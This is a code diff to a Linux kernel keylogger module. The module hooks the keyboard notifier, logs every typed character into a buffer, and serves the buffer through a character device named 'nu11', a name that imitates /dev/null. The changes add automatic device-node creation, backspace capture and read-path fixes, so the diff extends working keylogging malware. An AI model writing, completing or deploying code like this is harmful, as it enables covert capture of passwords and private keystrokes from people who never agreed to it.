@@ -11,15 +11,27 @@
 #include <asm/segment.h>
 #include <linux/notifier.h>
 #include <linux/mm.h>
+#include <linux/kdev_t.h>
+#include <linux/device.h>
+#include <linux/cdev.h>
+#include <linux/types.h>
+#include <linux/version.h>
+#include <linux/errno.h>
 
 // Module Info
 
-#define SIZE_OF_MAP 94
+#define SIZE_OF_MAP 96 
 #define FILE_NAME "syslog.txt"
 #define DEVICE_NAME "nu11"
 
 /*============================== Declration ===========================*/
-static int major; // The Major Number that will be assigned to our Device Driver
+static int major = -1; // The Major Number that will be assigned to our Device Driver
+
+//
+static struct cdev mycdev;
+static struct class *key_logger_class = NULL;
+static int res;
+//
 
 // Keylogger Info
 
@@ -57,7 +69,7 @@ struct Map map[SIZE_OF_MAP] = {
 	{0x60,"[quoteleft]"},{0x61,"a"},{0x62,"b"},{0x63,"c"},{0x64,"d"},{0x65,"e"},{0x66,"f"},{0x67,"g"},{0x68,"h"},
 	{0x69,"i"},{0x6a,"j"},{0x6b,"k"},{0x6c,"l"},{0x6d,"m"},{0x6e,"n"},{0x6f,"o"},	
 	{0x70,"p"},{0x71,"q"},{0x72,"r"},{0x73,"s"},{0x74,"t"},{0x75,"u"},{0x76,"v"},{0x77,"w"},{0x78,"x"},{0x79,"y"},
-	{0x7a,"z"},{0x7b,"[braceleft]"},{0x7c,"[bar]"},{0x7d,"[braceright]"},{0x7e,"[asciitilde]"},	
+	{0x7a,"z"},{0x7b,"[braceleft]"},{0x7c,"[bar]"},{0x7d,"[braceright]"},{0x7e,"[asciitilde]"},{0x7f,"[backspace]"}
 };
 /*============================== End of the key map ===========================*/
 
@@ -77,6 +89,7 @@ const char * get_value(char key){
 
 // Setting the Device Driver read function
 static struct file_operations fops ={
+	.owner = THIS_MODULE,
 	.read = dev_read
 };
 
@@ -98,15 +111,15 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 		// We will only log those key presses that actually represent an ASCII character.
 		if (c == 0x01){
 			pr_info("[newline]");
-			*keys_buf_ptr = kvmalloc(strlen("[newLine]")+1,__GFP_NOMEMALLOC);
+			*keys_buf_ptr = kvmalloc(strlen("[newline]")+1,__GFP_NOMEMALLOC);
 			pr_info("[newline] malloc space");
 			if (*keys_buf_ptr){
-				strcpy(*keys_buf_ptr,"[newLine]");
+				strcpy(*keys_buf_ptr,"[newline]");
 				pr_info("%s has been writen to the key buff",*keys_buf_ptr);
 			}
 			keys_buf_ptr++;
 			buf_pos++;
-		} else if (c >= 0x20 && c < 0x7f){
+		} else if (c >= 0x20 && c <= 0x7f){
 			pr_info("%s",get_value(c));
 			*keys_buf_ptr = kvmalloc(strlen(get_value(c))+1,__GFP_NOMEMALLOC);
 			pr_info("%s malloc space",get_value(c));
@@ -139,7 +152,7 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action,void *da
 // each time we "cat" the char device we
 // should get one of the const char *
 static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset){
-	if (*offset > 0)
+	if (*offset > 0 || *keys_usr_ptr == 0)
 		return 0;
 	pr_info("Enter the dev_read function");
 	int len = strlen(*keys_usr_ptr);
@@ -160,13 +173,38 @@ static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t
 
 /*============================== Module init and exit ===========================*/
 static int __init keyLogger_birth(void){
-	major = register_chrdev(0 , DEVICE_NAME, &fops);
-	if (major < 0){
+	res = alloc_chrdev_region(&major,0,1, DEVICE_NAME "_proc");
+	if (res< 0){
 		pr_info("keylog failed to register a major number\n");
 		return major;
 	}
 
 	pr_info("Registered keylogger with major number %d",major);
+
+	if((key_logger_class = class_create(THIS_MODULE,DEVICE_NAME))==NULL){
+		pr_info("Class creation failed\n");
+		unregister_chrdev_region(major,1);
+		return -1;
+	}
+
+	if (device_create(key_logger_class, NULL, major, NULL, DEVICE_NAME) == NULL){
+	
+		pr_info("Divice creation failed\n");
+		class_destroy(key_logger_class);
+		unregister_chrdev_region(major, 1);
+		return -1;
+	}
+
+	cdev_init(&mycdev, &fops);
+	if (cdev_add(&mycdev,major,1) == -1){
+		pr_info("Divice addition failed\n");
+		device_destroy(key_logger_class,major);
+		class_destroy(key_logger_class);
+		unregister_chrdev_region(major, 1);
+		return -1;
+	}
+
+
 	register_keyboard_notifier(&nb);	// This will register our keylogger to the notifier, so any key stroke will be notice by us.
 	memset(keys_buffer, 0, BUFFER_LEN);
         pr_info("A new keyLogger was born\n");
@@ -174,6 +212,9 @@ static int __init keyLogger_birth(void){
 }
 
 static void __exit keyLogger_death(void){
+	device_destroy(key_logger_class,major);
+	class_destroy(key_logger_class);
+	unregister_chrdev_region(major, 1);
 	unregister_chrdev(major, DEVICE_NAME);
 	unregister_keyboard_notifier(&nb);
         pr_info("The keyLogger is dead\n");
